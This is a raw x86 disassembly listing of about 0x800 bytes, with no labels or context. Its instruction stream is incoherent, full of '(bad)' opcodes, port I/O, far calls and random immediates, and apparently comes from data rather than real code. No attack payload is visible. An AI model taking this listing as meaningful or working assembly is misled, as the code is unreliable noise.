  417e7c:	fmul   DWORD PTR [esi-0x2983f14f]
  417e82:	leave  
  417e83:	push   edi
  417e84:	fistp  DWORD PTR [edi+0x8ada64]
  417e8a:	outs   dx,BYTE PTR ds:[esi]
  417e8b:	aas    
  417e8c:	sbb    ebp,ebx
  417e8e:	push   cs
  417e8f:	ficomp DWORD PTR [eax]
  417e91:	inc    esi
  417e92:	in     al,0xd6
  417e94:	into   
  417e95:	adc    al,0x1c
  417e97:	fidiv  DWORD PTR [ebp+0x36]
  417e9a:	retf   
  417e9b:	(bad)  
  417e9d:	mov    ebp,0x982297d8
  417ea2:	lahf   
  417ea3:	mov    WORD PTR [edi+ecx*2+0x6673e669],es
  417eaa:	scas   al,BYTE PTR es:[edi]
  417eab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eac:	outs   dx,BYTE PTR ds:[esi]
  417ead:	fstp   QWORD PTR [ebx-0x35]
  417eb0:	fwait
  417eb1:	xor    DWORD PTR [esi+0x41],ecx
  417eb4:	fs jecxz 0x417e7c
  417eb7:	test   al,0x10
  417eb9:	push   edx
  417eba:	in     al,0x59
  417ebc:	shl    eax,1
  417ebe:	mov    esi,0x2e337fa1
  417ec3:	shr    DWORD PTR [eax],cl
  417ec5:	adc    BYTE PTR [ecx+0xc],cl
  417ec8:	stos   DWORD PTR es:[edi],eax
  417ec9:	push   ebp
  417eca:	mov    BYTE PTR [ecx+0x6b],ah
  417ecd:	cmp    eax,DWORD PTR ss:[ebx+0x6c]
  417ed1:	and    eax,DWORD PTR [edi-0x7b22e829]
  417ed7:	mov    WORD PTR [esi+0x54],gs
  417eda:	mov    edi,0xd261dbce
  417edf:	inc    esp
  417ee0:	nop
  417ee1:	or     bh,bl
  417ee3:	dec    ebp
  417ee4:	out    0x89,eax
  417ee6:	add    DWORD PTR [ecx-0x7aac8bc8],ebp
  417eec:	loope  0x417f47
  417eee:	(bad)  
  417eef:	mov    bh,0xf5
  417ef1:	(bad)  
  417ef2:	pop    ecx
  417ef3:	sub    BYTE PTR [ecx],al
  417ef5:	icebp  
  417ef6:	lods   al,BYTE PTR ds:[esi]
  417ef7:	mov    cl,0x5
  417ef9:	or     ch,dl
  417efb:	das    
  417efc:	js     0x417ebb
  417efe:	mov    ebx,0x876b81bc
  417f03:	test   ecx,eax
  417f05:	popa   
  417f06:	mov    ebx,0xb9d71237
  417f0b:	mov    esi,0xd902a3fd
  417f10:	das    
  417f11:	repnz mov bh,0x2d
  417f14:	fidiv  WORD PTR [ecx]
  417f16:	je     0x417f8d
  417f18:	pop    esp
  417f19:	pop    esi
  417f1a:	pusha  
  417f1b:	mov    bh,0x1e
  417f1d:	stos   DWORD PTR es:[edi],eax
  417f1e:	pop    ebx
  417f1f:	iret   
  417f20:	into   
  417f21:	cmp    eax,0x922922c3
  417f26:	adc    BYTE PTR [esi],al
  417f28:	mov    ebp,0xa8a055f8
  417f2d:	mov    edx,0x7db2576f
  417f32:	dec    eax
  417f33:	pop    gs
  417f35:	stc    
  417f36:	stos   DWORD PTR es:[edi],eax
  417f37:	mov    al,ds:0xcc0719f6
  417f3c:	xlat   BYTE PTR ds:[ebx]
  417f3d:	xchg   esi,eax
  417f3e:	cld    
  417f3f:	mov    ch,0xf6
  417f41:	sub    DWORD PTR [eax+0x5c3fef58],0x4217bf0f
  417f4b:	or     al,BYTE PTR [ebx]
  417f4d:	mov    dh,0x61
  417f4f:	hlt    
  417f50:	pop    es
  417f51:	push   0x43c5ca74
  417f56:	shl    BYTE PTR [ebp+0x4ae7042],cl
  417f5c:	ins    BYTE PTR es:[edi],dx
  417f5d:	cmp    ah,BYTE PTR [ecx+0x5e]
  417f60:	punpcklbw mm3,DWORD PTR [edx-0x38]
  417f64:	push   esp
  417f65:	mov    esp,0x8de75350
  417f6a:	fwait
  417f6b:	mov    edi,0x7fd018dc
  417f70:	nop
  417f71:	xchg   edi,eax
  417f72:	test   al,0xa3
  417f74:	out    0x3b,al
  417f76:	mov    bl,ch
  417f78:	xchg   esp,eax
  417f79:	sbb    eax,esp
  417f7b:	ja     0x417f85
  417f7d:	jmp    0x417f1e
  417f7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f80:	fbstp  TBYTE PTR [edi+0x3c1136f]
  417f86:	mov    WORD PTR [ebx],cs
  417f88:	test   DWORD PTR [eax+ebp*2],edx
  417f8b:	xor    dh,dh
  417f8d:	outs   dx,BYTE PTR ds:[esi]
  417f8e:	mov    ds,WORD PTR [edi]
  417f90:	jnp    0x417fe1
  417f92:	inc    ebp
  417f93:	sub    cl,BYTE PTR [eax]
  417f95:	mov    ebp,0x75fec749
  417f9a:	xor    DWORD PTR [edi+0xc1f30eb],0x7c
  417fa1:	push   esi
  417fa2:	fcomp  QWORD PTR [edx+0x48]
  417fa5:	jg     0x417f27
  417fa7:	xor    BYTE PTR [edi+ebx*2-0x44db8d4e],dl
  417fae:	das    
  417faf:	data16 and dl,dl
  417fb2:	pop    edi
  417fb3:	rcl    DWORD PTR [ecx],cl
  417fb5:	push   eax
  417fb6:	inc    ecx
  417fb7:	lss    esp,FWORD PTR [edx+ecx*4]
  417fbb:	push   0xa6417ccc
  417fc0:	and    DWORD PTR [edx-0x9],ebp
  417fc3:	xor    BYTE PTR [ebx],bh
  417fc5:	out    dx,al
  417fc6:	xor    edx,DWORD PTR [ecx+0x4a]
  417fc9:	sahf   
  417fca:	fidivr WORD PTR [eax]
  417fcc:	call   0x1403:0x583dccfd
  417fd3:	xor    eax,0xbd7e969f
  417fd8:	(bad)  
  417fd9:	xlat   BYTE PTR ds:[ebx]
  417fda:	les    ebp,FWORD PTR es:[edx-0x70b89d5f]
  417fe1:	jno    0x418052
  417fe3:	mov    eax,0xbb91766e
  417fe8:	push   esi
  417fe9:	inc    esp
  417fea:	ins    BYTE PTR es:[edi],dx
  417feb:	mov    ebx,0xaa0e596c
  417ff0:	or     ah,BYTE PTR [ecx+0x8ce8b9f]
  417ff6:	xor    esp,DWORD PTR [eax+ebp*2-0x53371fb4]
  417ffd:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  417fff:	aas    
  418000:	in     eax,0xda
  418002:	ja     0x417fc5
  418004:	jmp    0x418015
  418006:	or     edx,DWORD PTR [ecx+0x4d]
  418009:	and    DWORD PTR [eax+0x62],0x8960a25e
  418010:	lea    edx,ds:0xdd86c77e
  418016:	imul   ebp,DWORD PTR [ecx+edx*4-0x1b],0x42d27f58
  41801e:	stos   BYTE PTR es:[edi],al
  41801f:	xchg   esp,eax
  418020:	xchg   DWORD PTR [ecx-0x3d],ebx
  418023:	mov    WORD PTR [ecx+0x2c7cd472],ss
  418029:	xchg   BYTE PTR [eax],al
  41802b:	pop    esp
  41802c:	sub    dh,cl
  41802e:	push   0xffffff84
  418030:	push   esp
  418031:	mov    cl,0xa
  418033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418034:	xlat   BYTE PTR ds:[ebx]
  418035:	add    cl,ah
  418037:	stc    
  418038:	fcomp  QWORD PTR ds:0xe4c26f91
  41803e:	ror    DWORD PTR [ebp+0x13],1
  418041:	and    DWORD PTR [ecx+0x73fb434a],esp
  418047:	sub    DWORD PTR es:[ebx-0x60],esi
  41804b:	loopne 0x418093
  41804d:	sub    al,0x7c
  41804f:	cmp    bh,BYTE PTR [ebp-0x22]
  418052:	imul   BYTE PTR [ebp-0x24]
  418055:	pop    bx
  418057:	push   0x1a16286f
  41805c:	sub    eax,0xfad5f448
  418061:	push   esp
  418062:	fadd   QWORD PTR [ebx-0x74a7956f]
  418068:	ins    DWORD PTR es:[edi],dx
  418069:	and    DWORD PTR ds:0xa2e8858c,0x25
  418070:	and    BYTE PTR [esi+eax*8],bl
  418073:	call   0x8ff2:0xaab28b61
  41807a:	rcl    ecx,cl
  41807c:	or     al,0x14
  41807e:	das    
  41807f:	push   0x346de90b
  418084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418085:	ror    BYTE PTR [ecx+esi*2+0x57],1
  418089:	push   edi
  41808a:	push   es
  41808b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41808c:	in     eax,dx
  41808d:	xor    eax,DWORD PTR [esi+0x4aa597f4]
  418093:	lods   al,BYTE PTR ds:[esi]
  418094:	xlat   BYTE PTR ds:[ebx]
  418095:	(bad)  
  418096:	sar    BYTE PTR [edx+0x15c9f753],1
  41809c:	mov    ebx,0x517325af
  4180a1:	popf   
  4180a2:	inc    edx
  4180a3:	dec    edx
  4180a4:	mov    bh,0x8a
  4180a6:	cwde   
  4180a7:	out    0x3c,al
  4180a9:	(bad)  
  4180ab:	and    al,0xd1
  4180ad:	ret    0xaa90
  4180b0:	popf   
  4180b1:	jg     0x418044
  4180b3:	push   esi
  4180b4:	dec    eax
  4180b5:	loopne 0x418134
  4180b7:	dec    esp
  4180b8:	aam    0xb0
  4180ba:	imul   eax,DWORD PTR [esi],0xfffffff9
  4180bd:	jl     0x418089
  4180bf:	fcomp  DWORD PTR [ebx]
  4180c1:	call   0x8b27:0xbf69af33
  4180c8:	(bad)  
  4180ca:	inc    esi
  4180cb:	imul   edi,DWORD PTR [ebx+0x75],0x18
  4180cf:	pop    es
  4180d0:	popa   
  4180d1:	pop    ebx
  4180d2:	arpl   WORD PTR [ebx-0x2],sp
  4180d5:	mov    bh,0xd2
  4180d7:	and    ch,BYTE PTR [eax-0x5409d92f]
  4180dd:	pop    edx
  4180de:	mov    ah,0xaf
  4180e0:	adc    ebp,DWORD PTR [ecx]
  4180e2:	pop    es
  4180e3:	adc    eax,0xd06327ad
  4180e8:	inc    BYTE PTR [edi]
  4180ea:	out    dx,eax
  4180eb:	cmc    
  4180ec:	outs   dx,DWORD PTR ds:[esi]
  4180ed:	cmp    al,0x96
  4180ef:	ret    0x205b
  4180f2:	les    ebp,FWORD PTR fs:[ebx]
  4180f5:	and    DWORD PTR [edx+0x5bcb1b76],edx
  4180fb:	xchg   edi,eax
  4180fc:	sub    dh,BYTE PTR [eax-0x29]
  4180ff:	jge    0x418171
  418101:	test   eax,0xac4368f8
  418106:	out    0xca,al
  418108:	es pop ds
  41810a:	mov    esi,0x271c52ed
  41810f:	jbe    0x41817b
  418111:	imul   BYTE PTR [ebx+0x16]
  418114:	sbb    ch,0xa7
  418117:	test   BYTE PTR [edi],ah
  418119:	mov    ?,WORD PTR ds:0x2ec6803f
  41811f:	ss sub al,0x52
  418122:	push   ss
  418123:	adc    cl,BYTE PTR [esi]
  418125:	xor    dl,cl
  418127:	xor    bl,bl
  418129:	mov    cs,esi
  41812b:	sbb    al,0x12
  41812d:	scas   al,BYTE PTR es:[edi]
  41812e:	xor    eax,0xccc50bc
  418133:	lahf   
  418134:	sub    BYTE PTR [ebx],dl
  418136:	ins    BYTE PTR es:[edi],dx
  418137:	adc    DWORD PTR [ebp+0x5c3140c],esi
  41813d:	sub    bl,BYTE PTR [ecx-0x6b668c23]
  418143:	or     eax,0x1cd8441a
  418148:	mov    edx,0x394e01a8
  41814d:	mov    dl,0xed
  41814f:	and    si,WORD PTR [eax+0x22]
  418153:	or     esi,ecx
  418155:	mov    edx,0x7f05d855
  41815a:	out    0x78,eax
  41815c:	cmp    bh,BYTE PTR [ecx+0x37]
  41815f:	mov    edi,0x812591d1
  418164:	dec    ecx
  418165:	call   0x5b137653
  41816a:	xchg   edx,eax
  41816b:	icebp  
  41816c:	push   eax
  41816d:	adc    ah,dh
  41816f:	ss dec edx
  418171:	mov    ds:0x1e8172bc,eax
  418176:	enter  0xd65b,0x96
  41817a:	add    BYTE PTR [esi],cl
  41817c:	xchg   ebx,eax
  41817d:	mov    edi,DWORD PTR [esi]
  41817f:	stos   DWORD PTR es:[edi],eax
  418180:	into   
  418181:	or     al,BYTE PTR [ecx+0x7e9de203]
  418187:	outs   dx,BYTE PTR ds:[esi]
  418188:	add    eax,edx
  41818a:	or     DWORD PTR ds:0xd3c4a454,ebp
  418190:	loope  0x4181a2
  418192:	xor    BYTE PTR [edx+0x2b352e73],al
  418198:	mov    bl,0x63
  41819a:	fs xor eax,0x54b4158a
  4181a0:	or     bh,bl
  4181a2:	inc    edx
  4181a3:	test   DWORD PTR [ebp-0x16],ebp
  4181a6:	pop    eax
  4181a7:	cmc    
  4181a8:	test   BYTE PTR [ecx],ch
  4181aa:	sbb    eax,0xbcf61e9d
  4181af:	xlat   BYTE PTR ds:[ebx]
  4181b0:	clc    
  4181b1:	push   ebx
  4181b2:	repz push ecx
  4181b4:	adc    DWORD PTR [esi+edx*1-0x77],0xfffffff1
  4181b9:	xchg   ebx,eax
  4181ba:	pop    eax
  4181bb:	inc    edi
  4181bc:	mov    dh,0x25
  4181be:	ja     0x41820f
  4181c0:	lahf   
  4181c1:	int    0xf
  4181c3:	or     al,0x42
  4181c5:	jmp    0x418228
  4181c7:	out    0x18,al
  4181c9:	es pop eax
  4181cb:	cmp    dh,BYTE PTR [esi]
  4181cd:	arpl   WORD PTR [esi+ecx*1+0x49],bx
  4181d1:	in     al,0x7a
  4181d3:	mov    ecx,0xb4eca5ad
  4181d8:	cli    
  4181d9:	cmc    
  4181da:	xlat   BYTE PTR ds:[ebx]
  4181db:	jae    0x41824d
  4181dd:	mov    ecx,DWORD PTR [esp-0x54]
  4181e1:	sahf   
  4181e2:	mov    al,ds:0x99ba40b8
  4181e7:	mov    ecx,0xd034c043
  4181ec:	repnz mov edx,0x4bf05b77
  4181f2:	call   0x10dc:0xc4d86ddf
  4181f9:	cli    
  4181fa:	adc    BYTE PTR [edx+0x56d65b77],0x70
  418201:	jge    0x41821e
  418203:	push   edi
  418204:	ror    DWORD PTR [edi],0x24
  418207:	jb     0x418203
  418209:	xlat   BYTE PTR ds:[ebx]
  41820a:	(bad)  
  41820b:	xlat   BYTE PTR ds:[ebx]
  41820c:	push   cs
  41820d:	add    al,0xc1
  41820f:	jg     0x418264
  418211:	loope  0x418234
  418213:	lock dec edi
  418215:	test   ebp,edi
  418217:	popa   
  418218:	imul   esp,DWORD PTR [edx-0x1105e18],0x29
  41821f:	imul   eax,DWORD PTR [edi+0x216045f1],0xffffffa5
  418226:	or     esi,ebx
  418228:	mov    ds:0x677364cb,al
  41822d:	push   0x14
  41822f:	(bad)  
  418230:	and    BYTE PTR [ecx-0x3],cl
  418233:	and    eax,0x452ae354
  418238:	add    BYTE PTR [edi],dl
  41823a:	cdq    
  41823b:	call   0x273b:0x6c7cf670
  418242:	push   ecx
  418243:	mov    edi,0x243c48f9
  418248:	neg    edx
  41824a:	adc    edx,edx
  41824c:	and    BYTE PTR [ebx+eiz*2],bh
  41824f:	mov    ebp,0xf1cea2ba
  418254:	jbe    0x4181f4
  418256:	jo     0x418295
  418258:	sbb    dh,BYTE PTR [esi+0x25305579]
  41825e:	pusha  
  41825f:	ds clc 
  418261:	mov    edi,0x83027588
  418266:	dec    eax
  418267:	xor    dh,BYTE PTR [edi]
  418269:	adc    cl,BYTE PTR [edx]
  41826b:	rcr    DWORD PTR [ebp-0x249249ef],1
  418271:	lods   al,BYTE PTR ds:[esi]
  418272:	int3   
  418273:	mov    eax,ds:0x1fd4558d
  418278:	lods   al,BYTE PTR cs:[esi]
  41827a:	retf   0xe3c6
  41827d:	sbb    eax,0x4bdad3f8
  418282:	popf   
  418283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418284:	out    dx,eax
  418285:	lods   eax,DWORD PTR ds:[esi]
  418286:	add    eax,0x549597af
  41828b:	in     eax,dx
  41828c:	in     al,dx
  41828d:	pop    edx
  41828e:	mov    eax,0x916a258f
  418293:	hlt    
  418294:	(bad)  
  418295:	repz icebp 
  418297:	sar    DWORD PTR [edx],cl
  418299:	mov    ?,WORD PTR [ebp+0x2]
  41829c:	loop   0x41828f
  41829e:	rol    eax,cl
  4182a0:	out    0x62,al
  4182a2:	(bad)  
  4182a3:	je     0x4182ed
  4182a5:	mov    ds:0x66772eb8,al
  4182aa:	popa   
  4182ab:	pop    edi
  4182ac:	dec    esi
  4182ad:	pop    eax
  4182ae:	mov    bh,0x7a
  4182b0:	ins    BYTE PTR es:[edi],dx
  4182b1:	data16 adc al,0x69
  4182b4:	aas    
  4182b5:	or     ecx,edx
  4182b7:	cmp    edi,edi
  4182b9:	mov    ds:0x79727c1f,al
  4182be:	test   al,0x63
  4182c0:	sbb    BYTE PTR [ecx],0xf6
  4182c3:	sub    esp,eax
  4182c5:	out    dx,al
  4182c6:	(bad)  
  4182c8:	pop    esi
  4182c9:	std    
  4182ca:	sbb    BYTE PTR [esi-0x6e676234],dl
  4182d0:	sahf   
  4182d1:	sbb    BYTE PTR [ebx-0xba710e0],ah
  4182d7:	mov    edi,0xc18c255e
  4182dc:	pusha  
  4182dd:	ja     0x41827f
  4182df:	xchg   ebp,eax
  4182e0:	push   ebx
  4182e1:	mov    BYTE PTR [ecx-0x9],bh
  4182e4:	ja     0x41829d
  4182e6:	mov    ebx,0x3a78ea20
  4182eb:	lock pop ds
  4182ed:	sub    eax,0x50065dac
  4182f2:	ins    DWORD PTR es:[edi],dx
  4182f3:	sub    edx,0x7e71469e
  4182f9:	xchg   edi,eax
  4182fa:	dec    ebp
  4182fb:	push   ebx
  4182fc:	inc    eax
  4182fd:	nop
  4182fe:	inc    eax
  4182ff:	pop    ebp
  418300:	xor    DWORD PTR [ebx+esi*8],ebx
  418303:	xor    BYTE PTR [eax+0x72bd2f71],dh
  418309:	or     ecx,DWORD PTR [edi+0x3c2ff720]
  41830f:	mov    ebp,ebx
  418311:	daa    
  418312:	sbb    DWORD PTR [ecx-0x6bdc59d9],edi
  418318:	les    edx,FWORD PTR [edx+0x20]
  41831b:	add    DWORD PTR [ebx+0x64b9f370],eax
  418321:	dec    esi
  418322:	jmp    0x4182dc
  418324:	xchg   esp,eax
  418325:	sbb    DWORD PTR [ebx-0x68],0xfffffff3
  418329:	js     0x418382
  41832b:	lds    eax,FWORD PTR [ebp-0x7d]
  41832e:	add    BYTE PTR [edx+0x6],dh
  418331:	mov    ds:0x83edb026,al
  418336:	inc    ebp
  418337:	push   edx
  418338:	sti    
  418339:	outs   dx,DWORD PTR ds:[esi]
  41833a:	pop    ebp
  41833b:	inc    edx
  41833c:	cmp    BYTE PTR [ebx-0x42eb2ecf],dl
  418342:	jbe    0x418329
  418344:	jno    0x41836c
  418346:	dec    esp
  418347:	scas   eax,DWORD PTR es:[edi]
  418348:	dec    edx
  418349:	jne    0x41834b
  41834b:	shl    BYTE PTR [edx-0x42f18659],0xdc
  418352:	pop    ebx
  418353:	xchg   ebp,eax
  418354:	and    BYTE PTR [ecx+0xe],al
  418357:	dec    ecx
  418358:	mov    WORD PTR ds:0xf6430eec,es
  41835e:	xchg   edi,eax
  41835f:	ret    
  418360:	lods   al,BYTE PTR ds:[esi]
  418361:	mov    DWORD PTR [eax],edi
  418363:	xchg   ecx,eax
  418364:	jbe    0x4183b5
  418366:	mov    eax,ds:0x914e1125
  41836b:	(bad)  
  41836c:	fst    st(5)
  41836e:	sub    edx,ebp
  418370:	cmp    DWORD PTR [ebx],eax
  418372:	or     al,0x1f
  418374:	mov    esp,0x30bf2867
  418379:	in     eax,0x83
  41837b:	gs mov dl,dl
  41837e:	push   0x5b
  418380:	mov    cl,0x44
  418382:	loopne 0x4183f0
  418384:	call   0xdac6816e
  418389:	in     al,0xd3
  41838b:	cmp    DWORD PTR [edi],esi
  41838d:	inc    ebp
  41838e:	pop    edi
  41838f:	cmp    edx,ebx
  418391:	loope  0x4183fb
  418393:	test   al,0x61
  418395:	mov    esp,0xc3ac88ad
  41839a:	xor    eax,0x4691415
  41839f:	mov    ?,WORD PTR [edx+0x546dc9f9]
  4183a5:	sub    BYTE PTR [ebx+0x29],0x23
  4183a9:	mov    ds:0xb3362b39,eax
  4183ae:	arpl   WORD PTR [eax],si
  4183b0:	push   ebx
  4183b1:	arpl   WORD PTR [edi+eax*2+0xb],dx
  4183b5:	repz xchg edi,eax
  4183b7:	or     BYTE PTR [eax],cl
  4183b9:	retf   
  4183ba:	and    BYTE PTR [edi+0x5d47bf2a],dl
  4183c0:	inc    BYTE PTR [ebx+0x323eb24]
  4183c6:	sub    eax,0xed2d753a
  4183cb:	stc    
  4183cc:	dec    esp
  4183cd:	test   eax,0xb068b18e
  4183d2:	fst    DWORD PTR [ebx]
  4183d4:	icebp  
  4183d5:	imul   esi,DWORD PTR [edx+0x1fa6320b],0x80017612
  4183df:	and    cl,bl
  4183e1:	rcl    DWORD PTR [eax-0x1],0x89
  4183e5:	mov    ecx,0x58969564
  4183ea:	das    
  4183eb:	jmp    0x2af6:0x7d6d3e69
  4183f2:	and    al,0x42
  4183f4:	addr16 dec ecx
  4183f6:	mov    esp,0x86e8181c
  4183fb:	fadd   st(4),st
  4183fd:	cmp    al,0xce
  4183ff:	(bad)  
  418400:	mov    cl,0xc4
  418402:	jmp    0x8e2633dc
  418407:	jno    0x4183e3
  418409:	daa    
  41840a:	jae    0x41844c
  41840c:	repnz in al,0xcc
  41840f:	pop    ecx
  418410:	pop    esp
  418411:	cli    
  418412:	out    dx,al
  418413:	in     eax,dx
  418414:	mov    esi,0xe499a21e
  418419:	or     DWORD PTR [esp+esi*2-0x4a],edx
  41841d:	mov    ch,0x45
  41841f:	xchg   ebp,eax
  418420:	sti    
  418421:	loopne 0x4183c3
  418423:	cli    
  418424:	popa   
  418425:	(bad)  
  418427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418428:	inc    ebx
  418429:	cmc    
  41842a:	dec    edi
  41842b:	pop    edx
  41842c:	jmp    0x905d:0x5f95e394
  418433:	jmp    0x41845e
  418435:	mov    ds:0x28b2be91,eax
  41843a:	dec    esi
  41843b:	xchg   DWORD PTR [ebx-0x6a],edi
  41843e:	xchg   ecx,eax
  41843f:	sbb    edi,ecx
  418441:	xchg   edi,eax
  418442:	mov    ds:0x8155f362,eax
  418447:	and    eax,0x3a0857e6
  41844c:	cmp    DWORD PTR [esi-0x1d],edi
  41844f:	mov    edi,0xdb35e4ef
  418454:	fcomp  DWORD PTR [ebp-0x65]
  418457:	dec    ebx
  418458:	xchg   ecx,eax
  418459:	push   ds
  41845a:	bnd ret 
  41845c:	cld    
  41845d:	mov    al,0x16
  41845f:	pop    ds
  418460:	popa   
  418461:	cdq    
  418462:	cdq    
  418463:	test   eax,0x84f49b9e
  418468:	dec    esi
  418469:	fbstp  TBYTE PTR [ebp+0x5ba1f15f]
  41846f:	add    ecx,eax
  418471:	cmp    bh,bl
  418473:	addr16 retf 0x6f2a
  418477:	ficom  DWORD PTR [edx]
  418479:	mov    bl,0x7
  41847b:	inc    ecx
  41847c:	aam    0x96
  41847e:	or     ch,BYTE PTR [edx+0x719e30bc]
  418484:	aad    0xe7
  418486:	push   ds
  418487:	hlt    
  418488:	mov    ds:0x8105f7e,al
  41848d:	out    dx,eax
  41848e:	xor    ebp,0x33
  418491:	aad    0xe1
  418493:	push   ss
  418494:	mov    al,cl
  418496:	repz shl DWORD PTR [eax+0x9ce1929],0xc9
  41849e:	in     al,0xe
  4184a0:	sbb    DWORD PTR [ebx+ebp*2],0xffffffc5
  4184a4:	inc    esp
  4184a5:	jp     0x41844a
  4184a7:	xor    ecx,esp
  4184a9:	cmp    DWORD PTR [edx-0x48],0xffffffb7
  4184ad:	or     edx,ecx
  4184af:	push   ss
  4184b0:	push   esi
  4184b1:	pop    esp
  4184b2:	sub    edx,DWORD PTR [ebx]
  4184b4:	fsub   st,st(0)
  4184b6:	cmp    al,al
  4184b8:	inc    eax
  4184b9:	scas   al,BYTE PTR es:[edi]
  4184ba:	repz fadd DWORD PTR cs:[eax-0x42ea5225]
  4184c2:	and    ch,BYTE PTR es:[ecx-0x11]
  4184c6:	pushf  
  4184c7:	icebp  
  4184c8:	xor    al,0xaa
  4184ca:	call   0x4c6f2daa
  4184cf:	xchg   DWORD PTR [esi],eax
  4184d1:	or     eax,0x74c9b491
  4184d6:	in     al,0xab
  4184d8:	stos   DWORD PTR es:[edi],eax
  4184d9:	push   0x3a
  4184db:	pushf  
  4184dc:	(bad)  
  4184dd:	fcmovne st,st(2)
  4184df:	sub    ecx,DWORD PTR [eax+esi*1-0x27]
  4184e3:	xchg   ecx,eax
  4184e4:	or     DWORD PTR [eax+0x4a],esp
  4184e7:	pushf  
  4184e8:	call   0x6f39:0x4e5aa5df
  4184ef:	mov    edi,0x1c6f444f
  4184f4:	fs inc esp
  4184f6:	add    al,bh
  4184f8:	repz pop DWORD PTR [edi-0xb]
  4184fc:	ret    0x90ac
  4184ff:	xchg   DWORD PTR [bp+di-0x4c17],esp
  418504:	pop    es
  418505:	call   FWORD PTR [ebx+0x4a]
  418508:	jl     0x4184df
  41850a:	aaa    
  41850b:	jmp    0x8f53:0x921c109d
  418512:	jnp    0x4184b9
  418514:	xchg   edi,eax
  418515:	mov    esi,DWORD PTR [ecx+0x60b60adc]
  41851b:	adc    dl,al
  41851d:	xchg   edx,esp
  41851f:	lahf   
  418520:	test   al,0x34
  418522:	inc    DWORD PTR [esi-0x3b10ba07]
  418528:	add    DWORD PTR [edx-0x5e],esi
  41852b:	fistp  DWORD PTR [ecx-0xa]
  41852e:	daa    
  41852f:	dec    esp
  418530:	dec    ebx
  418531:	in     eax,0x96
  418533:	jge    0x41857c
  418535:	fstp   st(4)
  418537:	out    dx,al
  418538:	(bad)  
  418539:	mov    ebx,0x47376da8
  41853e:	xchg   esp,eax
  41853f:	out    dx,al
  418540:	mov    ch,0x29
  418542:	mov    eax,0xd97bdb52
  418547:	(bad)  [esi+0x1]
  41854a:	aad    0xb
  41854c:	inc    ebp
  41854d:	mov    ebp,0xc5a26b71
  418552:	add    al,0x6c
  418554:	mov    ds:0xafd220fb,eax
  418559:	pop    esi
  41855a:	pop    edx
  41855b:	or     BYTE PTR [ecx],bl
  41855d:	test   eax,0x504e19f5
  418562:	std    
  418563:	(bad)  
  418564:	pop    esp
  418565:	push   es
  418566:	pushf  
  418567:	push   ebp
  418568:	mov    al,ds:0xa61326d7
  41856d:	and    al,0x27
  41856f:	jmp    0x4185b0
  418571:	mov    DWORD PTR [ecx],eax
  418573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418574:	mov    ebp,0x98b433c7
  418579:	dec    eax
  41857a:	mov    esp,0xcb4af441
  41857f:	adc    al,0xa0
  418581:	sub    esp,DWORD PTR [ebx+0x3b2653b6]
  418587:	push   esp
  418588:	fiadd  WORD PTR [edx]
  41858a:	sub    al,0xa9
  41858c:	sbb    al,0x15
  41858e:	inc    ebp
  41858f:	mov    ecx,0x4e5d2efc
  418594:	xchg   DWORD PTR [edi-0x6e2667a1],esi
  41859a:	getsec 
  41859c:	and    BYTE PTR [ecx+esi*4+0x5c1ea6d5],dl
  4185a3:	pop    es
  4185a4:	add    dl,bh
  4185a6:	pop    esp
  4185a7:	sbb    eax,0xfd184c12
  4185ac:	xchg   edi,eax
  4185ad:	xlat   BYTE PTR ds:[ebx]
  4185ae:	xchg   edx,eax
  4185af:	mov    edx,0x486a36e
  4185b4:	and    BYTE PTR [ebx],bh
  4185b6:	push   es
  4185b7:	ins    BYTE PTR es:[edi],dx
  4185b8:	popa   
  4185b9:	repz pop edx
  4185bb:	iret   
  4185bc:	(bad)  
  4185bd:	popa   
  4185be:	div    DWORD PTR [esi+edi*8+0x48a137a1]
  4185c5:	enter  0x5e2a,0xa9
  4185c9:	iret   
  4185ca:	fldln2 
  4185cc:	fcom   QWORD PTR [esi]
  4185ce:	shl    BYTE PTR [edx],1
  4185d0:	dec    ecx
  4185d1:	sbb    bl,BYTE PTR [esi+0x32]
  4185d4:	lds    eax,FWORD PTR [edx]
  4185d6:	in     eax,0x45
  4185d8:	adc    edi,ebx
  4185da:	sub    al,0x91
  4185dc:	lock or BYTE PTR [edx],0x2e
  4185e0:	fst    DWORD PTR [edi]
  4185e2:	scas   al,BYTE PTR es:[edi]
  4185e3:	clc    
  4185e4:	adc    DWORD PTR [eax],ebp
  4185e6:	jno    0x41859f
  4185e8:	sbb    ch,BYTE PTR [edi-0x641305bd]
  4185ee:	dec    edx
  4185ef:	and    bl,bl
  4185f1:	mov    esi,0x427e0553
  4185f6:	pop    ecx
  4185f7:	int    0x78
  4185f9:	retf   
  4185fa:	xor    al,BYTE PTR [eax+0x1f]
  4185fd:	dec    ecx
  4185fe:	repz mov eax,0xf1413aba
  418604:	icebp  
  418605:	add    DWORD PTR [ecx+0x28],edx
  418608:	and    BYTE PTR [esi],dl
  41860a:	sub    eax,0xdb1126c0
  41860f:	fwait
  418610:	clc    
  418611:	fisttp DWORD PTR [ecx]
  418613:	mov    ebx,0xdb146a23
  418618:	lods   al,BYTE PTR ds:[esi]
  418619:	call   0xe683:0x545c4e9
  418620:	scas   eax,DWORD PTR es:[edi]
  418621:	mov    ch,0x1d
  418623:	pop    ebx
  418624:	mov    al,0x1b
  418626:	lods   eax,DWORD PTR ds:[esi]
  418627:	outs   dx,DWORD PTR ds:[esi]
  418628:	dec    ebx
  418629:	mov    ds:0x8c3773d9,eax
  41862e:	push   ebx
  41862f:	(bad)  
  418631:	push   0xffffffca
  418633:	call   0x22e2:0x726d9786
  41863a:	or     edi,eax
  41863c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41863d:	imul   edx,DWORD PTR [edi+eax*4-0x700e9633],0x8aa0122d
  418648:	push   esp
  418649:	dec    ecx
  41864a:	test   esp,0x81fc705a
  418650:	mov    BYTE PTR [ebx+0x67],dl
  418653:	ds das 
  418655:	fiadd  DWORD PTR ds:0xb3e45d8e
  41865b:	fwait
  41865c:	sahf   
  41865d:	cmp    eax,0xe88f76b3
  418662:	mov    ah,0x1c
  418664:	and    dl,bh
  418666:	adc    ah,ah
  418668:	push   cs
  418669:	jo     0x418614
